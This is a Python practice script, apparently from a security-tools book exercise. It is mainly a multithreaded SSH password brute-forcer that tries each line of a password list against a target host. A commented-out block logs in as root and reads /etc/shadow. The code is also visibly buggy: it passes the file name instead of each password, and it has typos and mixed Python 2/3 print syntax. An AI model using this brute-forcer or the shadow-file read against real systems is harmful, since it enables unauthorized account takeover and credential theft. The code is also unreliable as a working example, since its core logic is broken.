# 脚本没有跑过 仅作为练习

# -*- coding:utf-8 -*-
# import pexpect
# PROMPT = ['#','>>>','> ','\$']

# def send_command(child, cmd):
# 	child.sendline(cmd)
# 	child.expect(PROMPT)
# 	print(child.before)

# def connect(user, host, password):
# 	shh_newkey = 'Are you sure want to continue connecting'
# 	connStr = 'ssh ' + user + '@' + host # 拼凑命令
# 	child = pexpect.spawn(connStr)
# 	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:']) # 可用正则 

# 	if ret == 0:
# 		print("[-] Error Connecting")
# 		return
# 	if ret == 1:
# 		chile.sendline('yes')
# 		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
# 	if ret == 0:
# 		print("[-] Error Connecting")
# 		return

# 	child.sendline(password)
# 	child.expect(PROMPT)
# 	return child

# def main():
# 	user = 'root'
# 	host = 'localhost'
# 	password = 'root'
# 	child = connect(user, host, password)
# 	send_command(child, 'cat /etc/shadow | grep root')

# if __name__ == '__main__':
# 	main()

import pxssh
import optparse
import time
import threading

maxConnection = 5
connection_lock = threading.BoundedSemaphore(value=maxConnection)
Found = False
Fails = 0


def send_commend(s, cmd):
	s.sendline(cmd)
	s.prompt()
	print(s.before)

def connect(host, user, password, release):
	global Found, Fails

	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print("[+] Password Found : " + password)
		Found = True
	except Exception as e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, password, False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, password, False)

	finally:
		if release: 
			connection_lock.release()

def main():
	parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -f <password list>') # %prog 当前程序名
	parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
	parser.add_option('-u', dest='user', type='string', help='specify the user')
	parser.add_option('-f', dest='passwordFile', type='string', help='specify password file')
	
	(options, args) = parser.parse_args()
	host = options.tgtHost
	user = options.user
	passwordFile = options.passwordFile

	if host == None or user == None or passwordFile == None:
		print(parser.usage)
		exit(0)

	fn = open(passwordFile, 'r') # open with reading model
	for line in fn.readlines():
		if Found:
			print "[*] Exiting: Password Found"
			exit(0)
		if Fails > 5 : # 书中此处的判断 存在于 if Found: 下   觉得似乎有些不妥 做了修改
			print "[!] Exiting: Too Many Socket Timeouts"
			exit(0)
		connection_lock.acquire() # 上锁 防止在命令行中打印顺序错乱
		password = line.strip('\r').strip('\n')
		print("[-] Testing :" + password)
		t = threading.Thread(target=connect, args=(host, user, passwordFile, True)) # 多线程
		t.start()

if __name__ == '__main__':
	main()
	